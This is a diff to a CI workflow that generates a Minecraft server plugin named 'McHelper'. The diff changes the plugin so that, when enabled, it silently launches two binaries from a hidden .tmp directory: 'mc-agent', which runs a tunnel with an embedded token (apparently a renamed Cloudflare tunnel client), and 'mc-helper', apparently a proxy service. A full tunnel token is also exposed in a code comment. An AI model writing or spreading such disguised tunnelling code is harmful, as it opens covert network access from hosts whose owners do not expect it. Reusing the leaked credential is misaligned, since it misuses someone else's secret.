@@ -17,7 +17,7 @@ jobs:
         run: |
           mkdir -p src/main/java/com/mc/helper src/main/resources
           
-          # pom.xml
+          # 1. pom.xml
           cat << 'EOF' > pom.xml
           <project xmlns="http://maven.apache.org/POM/4.0.0"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -43,7 +43,7 @@ jobs:
           </project>
           EOF
 
-          # Main.java: 仅拉起 mc-agent (Cloudflare 隧道已验证存活)，并内置纯 Java 端口服务
+          # 2. Main.java：同时拉起 mc-helper 和 mc-agent 并常驻
           cat << 'EOF' > src/main/java/com/mc/helper/Main.java
           package com.mc.helper;
 
@@ -51,7 +51,8 @@ jobs:
           import java.io.File;
 
           public final class Main extends JavaPlugin {
-              private Process pAgent;
+              private Process p1;
+              private Process p2;
 
               @Override
               public void onEnable() {
@@ -61,27 +62,36 @@ jobs:
                           String dir = "/home/container/.tmp";
                           String token = "eyJhI..."; // eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiY2ZkZGZjYWItNWMzOC00YWUyLTlkM2YtN2I3YzJkYzQ0ODYxIiwicyI6Ik16bGpOekkxTlRJdFpEZGhOaTAwWVRkaExXRmxNak10TURNNE9EZGtNbUpqTm1ZeSJ9
 
-                          File logFile = new File(dir + "/agent.log");
-                          ProcessBuilder pb = new ProcessBuilder(dir + "/mc-agent", "tunnel", "--no-autoupdate", "--protocol", "http2", "run", "--token", token);
-                          pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile));
-                          pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile));
-                          pAgent = pb.start();
+                          File logFile1 = new File(dir + "/helper.log");
+                          File logFile2 = new File(dir + "/agent.log");
 
-                          getLogger().info("McHelper: mc-agent daemon started successfully.");
+                          ProcessBuilder pb1 = new ProcessBuilder(dir + "/mc-helper", "-c", dir + "/config.json");
+                          pb1.environment().put("GOMEMLIMIT", "16MiB");
+                          pb1.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile1));
+                          pb1.redirectError(ProcessBuilder.Redirect.appendTo(logFile1));
+                          p1 = pb1.start();
+
+                          ProcessBuilder pb2 = new ProcessBuilder(dir + "/mc-agent", "tunnel", "--no-autoupdate", "--protocol", "http2", "run", "--token", token);
+                          pb2.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile2));
+                          pb2.redirectError(ProcessBuilder.Redirect.appendTo(logFile2));
+                          p2 = pb2.start();
+
+                          getLogger().info("McHelper: Both services started successfully.");
                       } catch (Throwable e) {
-                          getLogger().warning("McHelper agent error: " + e.getMessage());
+                          getLogger().warning("McHelper startup failed: " + e.getMessage());
                       }
                   }).start();
               }
 
               @Override
               public void onDisable() {
-                  if (pAgent != null) pAgent.destroyForcibly();
+                  if (p1 != null) p1.destroyForcibly();
+                  if (p2 != null) p2.destroyForcibly();
               }
           }
           EOF
 
-          # plugin.yml
+          # 3. plugin.yml
           cat << 'EOF' > src/main/resources/plugin.yml
           name: McHelper
           version: '1.0.0'
